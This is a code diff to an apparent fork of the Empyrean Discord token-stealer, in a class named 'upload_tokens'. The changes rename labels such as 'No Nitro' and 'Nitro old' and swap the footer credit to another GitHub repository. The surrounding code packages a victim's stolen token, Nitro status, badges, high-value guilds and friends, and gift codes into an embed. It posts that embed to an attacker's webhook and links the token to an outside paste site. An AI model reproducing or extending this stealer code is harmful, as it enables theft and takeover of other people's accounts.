@@ -245,11 +245,11 @@ class upload_tokens:
                               for flag in self.calc_flags(user['public_flags'])])
 
             if user['premium_type'] == 0:
-                nitro = 'None'
+                nitro = 'No Nitro'
             elif user['premium_type'] == 1:
-                nitro = 'Nitro Classic'
+                nitro = 'Nitro old'
             elif user['premium_type'] == 2:
-                nitro = 'Nitro'
+                nitro = 'Nitro Normal'
             elif user['premium_type'] == 3:
                 nitro = 'Nitro Basic'
             else:
@@ -357,7 +357,7 @@ class upload_tokens:
             embed.set_thumbnail(url=avatar)
 
             embed.add_field(name="<a:pinkcrown:996004209667346442> Token:",
-                            value=f"```{token}```\n[Click to copy!](https://paste-pgpj.onrender.com/?p={token})\n\u200b", inline=False)
+                            value=f"```{token}```\n[COPY](https://paste-pgpj.onrender.com/?p={token})\n\u200b", inline=False)
             embed.add_field(
                 name="<a:nitroboost:996004213354139658> Nitro:", value=f"{nitro}", inline=True)
             embed.add_field(name="<a:redboost:996004230345281546> Badges:",
@@ -378,12 +378,12 @@ class upload_tokens:
 
             if hq_guilds != None:
                 embed.add_field(
-                    name="<a:earthpink:996004236531859588> HQ Guilds:", value=hq_guilds, inline=False)
+                    name="<a:earthpink:996004236531859588> Guilds:", value=hq_guilds, inline=False)
                 embed.add_field(name="\u200b", value="\u200b", inline=False)
 
             if hq_friends != None:
                 embed.add_field(
-                    name="<a:earthpink:996004236531859588> HQ Friends:", value=hq_friends, inline=False)
+                    name="<a:earthpink:996004236531859588> Friends:", value=hq_friends, inline=False)
                 embed.add_field(name="\u200b", value="\u200b", inline=False)
 
             if codes != None:
@@ -391,7 +391,7 @@ class upload_tokens:
                     name="<a:gift:1021608479808569435> Gift Codes:", value=codes, inline=False)
                 embed.add_field(name="\u200b", value="\u200b", inline=False)
 
-            embed.set_footer(text="github.com/addi00000/empyrean")
+            embed.set_footer(text="https://github.com/duckboxxer/empyrean-back/")
 
             self.webhook.send(embed=embed, username="DuckWalk",
                               avatar_url="https://uploads.dailydot.com/2024/10/smoking-duck-meme.jpg?auto=compress&fm=pjpg")
